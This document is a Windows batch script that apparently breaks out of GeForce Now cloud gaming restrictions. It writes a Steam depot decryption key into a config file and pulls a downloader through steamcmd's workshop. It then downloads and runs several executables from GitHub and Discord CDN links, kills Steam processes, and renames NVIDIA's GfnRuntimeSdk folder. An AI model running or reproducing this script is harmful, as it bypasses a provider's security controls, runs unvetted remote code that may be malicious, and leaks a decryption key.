
@echo off
:MAIN:
MD "B:\SF" >NUL 2>&1

IF EXIST "E:\Asgard\GameLibrary\100192311\build\steamcmd" goto :E
IF EXIST "B:\Asgard\GameLibrary\100192311\build\steamcmd" goto :B
IF EXIST "F:\Asgard\GameLibrary\100192311\build\steamcmd" goto :F
IF EXIST "D:\Asgard\GameLibrary\100192311\build\steamcmd" goto :D
IF EXIST "G:\Asgard\GameLibrary\100192311\build\steamcmd" goto :G


:D:
D:
cd "D:\Asgard\GameLibrary\100192311\build\steamcmd"
cls
START "" "C:\Program Files (x86)\NVIDIA_Grid_Bundle\steamworks_common_redistributables\steamcmd\steamcmd.exe" +force_install_dir "C:/Program Files (x86)/Steam/steamapps/common/Steamworks Shared/_CommonRedist/" 
goto aftersteam


:F:
F:
cd "F:\Asgard\GameLibrary\100192311\build\steamcmd"
cls
START "" "C:\Program Files (x86)\NVIDIA_Grid_Bundle\steamworks_common_redistributables\steamcmd\steamcmd.exe" +force_install_dir "C:/Program Files (x86)/Steam/steamapps/common/Steamworks Shared/_CommonRedist/" 
goto aftersteam

:B:
B:
cd "B:\Asgard\GameLibrary\100192311\build\steamcmd"
cls
START "" "C:\Program Files (x86)\NVIDIA_Grid_Bundle\steamworks_common_redistributables\steamcmd\steamcmd.exe" +force_install_dir "C:/Program Files (x86)/Steam/steamapps/common/Steamworks Shared/_CommonRedist/" 
goto aftersteam

:E:
E:
cd "E:\Asgard\GameLibrary\100192311\build\steamcmd"
cls
START "" "C:\Program Files (x86)\NVIDIA_Grid_Bundle\steamworks_common_redistributables\steamcmd\steamcmd.exe" +force_install_dir "C:/Program Files (x86)/Steam/steamapps/common/Steamworks Shared/_CommonRedist/" 
goto aftersteam

:G:
G:
cd "G:\Asgard\GameLibrary\100192311\build\steamcmd"
cls
START "" "C:\Program Files (x86)\NVIDIA_Grid_Bundle\steamworks_common_redistributables\steamcmd\steamcmd.exe" +force_install_dir "C:/Program Files (x86)/Steam/steamapps/common/Steamworks Shared/_CommonRedist/" 
goto aftersteam

:aftersteam
C:
cls
echo "InstallConfigStore"{"Software"{"Valve"{"steam"{"depots"{"382490"{"DecryptionKey" "862e956521df2d7593e26b0401a13c1b574d118abd47cf701962302eb5130451"}}}}}} > "C:\Program Files (x86)\NVIDIA_Grid_Bundle\steamworks_common_redistributables\steamcmd\config\config.vdf"|clip
(echo workshop_download_item 382490 2286097686 && echo. && echo quit && echo.)|clip
ECHO First login with your steam account on steamcmd after that ctrl+v
:ok:
IF EXIST "C:\Program Files (x86)\Steam\steamapps\common\Steamworks Shared\_CommonRedist\steamapps\workshop\content\382490\2286097686\downloader.exe" goto :bruh
goto :ok:
:bruh:
cd "C:\Program Files (x86)\Steam\steamapps\common\Steamworks Shared\_CommonRedist\steamapps\workshop\content\382490\2286097686"
SET DL="C:\Program Files (x86)\Steam\steamapps\common\Steamworks Shared\_CommonRedist\steamapps\workshop\content\382490\2286097686\downloader.exe"
cd /d "B:\weinForce\"
%DL% -LJOk "https://raw.githubusercontent.com/MahGazz/ShadowForce/main/SF.exe"
start "" "SF.exe"
timeout 1 /nobreak >NUL 2>&1
%DL% -LJOk "https://ddn.discordapp.com/attachments/789457246189781054/790407979870453760/oneGFN.exe"
SET EXT="B:\weinForce\oneGFN.exe"
goto unsup

:unsup
C:
cd\
START "" "C:\Program Files (x86)\Steam\_steam_installer\SteamSetup.exe"
tskill steam
cd\
REN "%LOCALAPPDATA%\NVIDIA Corporation\GfnRuntimeSdk" UsgxDDD
REN "%LOCALAPPDATA%\NVIDIA Corporation\GfnRuntimeSdk" UsgxDDD
cd C:\Program Files (x86)\Steam\steamapps\common\Steamworks Shared\_CommonRedist\OpenAL\2.0.7.0
%DL% -LJOk "https://cdn.discordapp.com/attachments/795041832378826795/796083874068824114/steam.exe.old"
timeout 1 /nobreak
start steam.exe.old
B:
cd\
md Steam 
cd Steam
%DL% -LJOk "https://cdn.discordapp.com/attachments/741059833163153469/763423169230667816/steam.exe"
TSKILL SteamSetup
start "" "B:\Steam\steam.exe"

exit 
